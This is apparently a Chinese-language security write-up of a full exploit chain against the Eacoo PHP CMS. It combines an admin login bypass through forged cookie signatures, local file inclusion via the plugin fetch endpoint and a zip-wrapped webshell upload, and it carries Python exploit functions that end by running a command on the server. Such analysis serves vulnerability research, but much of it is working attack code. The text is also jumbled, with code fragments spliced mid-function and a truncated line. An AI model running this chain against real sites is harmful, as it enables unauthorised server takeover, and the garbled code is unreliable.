Eacoo Fullchain Exploit分析
Bug1: 登录绕过
  登录绕过主要是框架的设计存在一些问题,可以通过构造cookie触发该逻辑漏洞,然后设置成指定uid登
录.触发的逻辑是使用user profile接口
  关键点在于is_login()的逻辑
//  apps/user/controller/Personal.php
    public function profile() {
        if(!is_login()){
          $this->error('未登录');
        }
        if (IS_POST) {
          /* 省略代码 */
        }else {
          // 获取账号信息
          $user_info = get_user_info(is_login());  //  获取登录信息,主要关注
is_login()的逻辑
          unset($user_info['password']);
          unset($user_info['auth_group']['max']);
          $this->assign('user_info',$user_info);
          return $this->fetch();
        }
    }
//  apps/admin/logic/AdminUser.php
    public static function isLogin()
    {
        $user = session('admin_login_auth');
        if (empty($user)) {  //  从session中获取admin_login_auth,如果是未登录的账号,
此处必定为空,进入下面的逻辑
            if (cookie('?admin_uid') && cookie('?admin_signin_token')) {  //  从
cookie中获取对应的字段
                $user = self::get(cookie('admin_uid'));
                if ($user) {  //  从cookie中获取user字段
                    $signin_token = data_auth_sign($user->username.$user-
>uid.$user->last_login_time);  //  计算出一个签名
  eacoo的管理员账号为admin,对应的uid为1.从此处判断登录的代码可知,要满足等于admin管理员的
token签名校验,就必须要满足: admin_signin_token=data_auth_sign('admin1' + 
last_login_time) .在这里就要两个要素需要解决:
1. data_auth_sign()的代码是怎么处理hash的
2. 怎么样获取last_login_time的值
  关于data_auth_sign()的实现,代码如下,简单来说就是对传入的字符做了一次sha1运算
  也就是说,传入的数据需要满足 admin_signin_token=sha1('admin1' + last_login_time) .对于指
定uid的last_login_time值,可以通过链接 /public/index.php/user/index/info/uid/1.html 来泄漏.
那么最终的利用构造如下:
                    if (cookie('admin_signin_token') == $signin_token) {  //  如
果这个签名等于cookie中admin_signin_token的话,那么就认为登录成功
                        // 自动登录
                        self::autoLogin($user, true);  //  以传入来的uid为身份设置登
录状态
                        return $user->uid;
                    }
                }
            };
            return 0;
        } else{
            return session('admin_activation_auth_sign') == 
data_auth_sign($user) ? $user['uid'] : 0;
        }
    }
//  apps/functions/string.php
/**
 * 数据签名认证
 * @param  array $data 被认证的数据
 * @return string       签名
 * @author 麦当苗儿 
 */
function data_auth_sign($data)
{
    //数据类型检测
    if (!is_array($data)) {
        $data = (array)$data;
    }
    ksort($data); //排序
    $code = http_build_query($data); //url编码并生成query字符串
    $sign = sha1($code); //生成签名
    return $sign;
}
  至此就可以获得后台管理员权限了
Bug2: 本地文件包含
  这个漏洞的产生是因为eacoo提供支持插件加载的操作,加载插件内容的代码在这里,要调用该接口必须
要有管理员权限
def bug_admin_eop_in_home(eacoo_php_base_url) :
    get_admin = requests.get(eacoo_php_base_url + 
'/public/index.php/user/index/info/uid/1.html')
    page_data = get_admin.text
    flag = ''
    if -1 == page_data.find(flag) :
        print('Get Admin Error !')
        exit() 
    last_login_time = page_data[ page_data.rfind(flag) + len(flag) : ].strip()
    last_login_time = last_login_time[ 5 : last_login_time.find('name);  //  (1)
            $action = input('param._action');
        }
        $controller = input('param._controller','');
        $template = $template_name = $template == '' ? $controller.'/'.$action : 
$template;  //  在这里$template默认是空参数,所以会走逻辑$template = 
$controller.'/'.$action  (2)
        if (!is_file($template)) {  //  注意这个判断
            $current_theme_path = THEME_PATH.CURRENT_THEME.'/';
            $theme_plugin_path  = $current_theme_path.'plugins/'.$plugin.'/';
            $template     = $theme_plugin_path.$template . '.' 
.config('template.view_suffix');
            if (!is_file($template)) {
                $template = $this->pluginPath. 'view/'. $template_name . '.' 
.config('template.view_suffix');
                if (!is_file($template)) {
                    throw new \Exception('模板不存在：'.$template, 5001);
                }
            }
        }
        echo $this->view->fetch($template, $vars, $replace, $config, $render); 
 //  主要能够到这里,就可以进行文件包含,参考thinkphp的fetch()的实现,关键是要控制$template参
数,到指定路径  (3)
    }
$template = $controller.'/'.$action
如果要可控目录和文件名,那么就必须要走到备注(1)的路径,走到路径
$plugin = input('param._plugin',$this->name);  //  (1)
$action = input('param._action');
此时就可以可控目录和文件名,如果走($plugin_name != '')的话,那么$action的值为index就不可控了
  对于这个文件包含的漏洞,还需要两个要素:
1. 包含文件的路径
2. 包含文件的名字
  这两个要素都可以在文件上传的接口中返回
Bug3: 上传绕过
  现在有了个本地文件包含的漏洞,接下来的利用思路就是需要搭配文件上传,让php代码传到服务器上,然
后通过本地文件包含去执行代码.上传文件的逻辑在管理员后台的文件上传接口,调用该接口就必须要有管
理员登录的状态
  接下来关注文件上传的代码:
def bug_rfi(eacoo_php_base_url,upload_path,upload_avater_name,is_debug_output = 
False) :
    #  picture = ../public/uploads/avatar/1
    #  file = ../public/uploads/file/2020-03-31
    url = eacoo_php_base_url + '/public/index.php/home/plugin/fetch?
_plugin=1&_action=%s&_controller=../public%s' % (upload_avater_name,upload_path)
    responed = requests.get(url)
    if 404 == responed.status_code :
        return False
    responed = requests.post(url,data = { WEB_SHELL_KEY : 'echo "%s";' % 
(ECHO_KEY)})
    if is_debug_output :
        print(responed.text.encode('UTF-8'))
    if ECHO_KEY in responed.text :
        return url
    return False
//  apps/admin/controller/Upload.php
    public function upload() {
        $controller = new UploadLogic;
        $return = $controller->upload();
        return json($return);
    }
  在保存上传文件的时候有一些判断:
1. 上传的文件拓展名(image_exts)只能选择doc,docx,xls,xlsx,ppt,pptx,pdf,wps,txt,zip,rar,gz,bz2,7z
2. 上传的文件会保存到路径 ./uploads/file/文件上传年月日
  即便这样也没有问题,利用方法就是直接把shell写进zip文件,然后触发本地文件包含去调用zip里面的数
据就可以了.
//  apps/common/logic/Upload.php
    public function upload($param = []) {
        try {
            $upload_type = $this->request->param('type', 'picture', 'trim');
            $config      = config('attachment_options');
            $config['subName']=['date','Y-m-d'];
            if ($upload_type=='picture') {
                $config['maxSize']  = $config['image_max_size'];
                $config['exts']     = $config['image_exts'];
                $config['saveName'] = $config['image_save_name'];
            } else{  //  如果是直接上传文件就会走这个逻辑
                $config['maxSize']  = $config['file_max_size'];
                $config['exts']     = $config['file_exts'];
                $config['saveName'] = $config['file_save_name'];
            }
           $this->path_type = $this->request->param('path_type', 'picture', 
'trim');
            $upload_path = './uploads/'.$this-
>path_type.'/'.call_user_func_array($config['subName'][0],[$config['subName']
[1],time()]);  //  拼接上传文件路径
            $file = $this->request->file('file');  //  从POST请求中读取文件数据
            if (!$file) {
                throw new \Exception("file对象文件为空，或缺失环境组件。错误未知，请前往
社区反馈",0);
            }
            if (!$file-
>validate(['size'=>$config['maxSize'],'ext'=>$config['exts']])) {//验证通过
                throw new \Exception($file->getError(), 0);
            }
如何fullchain
  这是由三个漏洞一环环配合而互相配合触发的未授权rce.第一步先要进行登录绕过,获得管理员权限,然
后才能够进行文件上传和文件包含.
def bug_arbitrarily_file_upload(eacoo_php_base_url,eop_prilivige_session) :
    url = eacoo_php_base_url + '/public/index.php/upload?
type=file&path_type=file'
    webshell_file = { 'file': ('report.zip', '' % (WEB_SHELL_KEY)) }
    responed = eop_prilivige_session.post(url,files = webshell_file)
    upload_result = json.loads(responed.text)
    if not upload_result['data'] :
        return False
    upload_path = upload_result['data']['path']
    return upload_path
    eop_prilivige_session = bug_admin_eop_in_home(TEST_EACOO_BASE_URL)
    upload_file = 
bug_arbitrarily_file_upload(TEST_EACOO_BASE_URL,eop_prilivige_session)
    upload_file_path,upload_file_name = os.path.split(upload_file)
    check_rce_url = 
bug_rfi(TEST_EACOO_BASE_URL,upload_file_path,upload_file_name)
    try_execute_web_shell(check_rce_url,'ipconfig')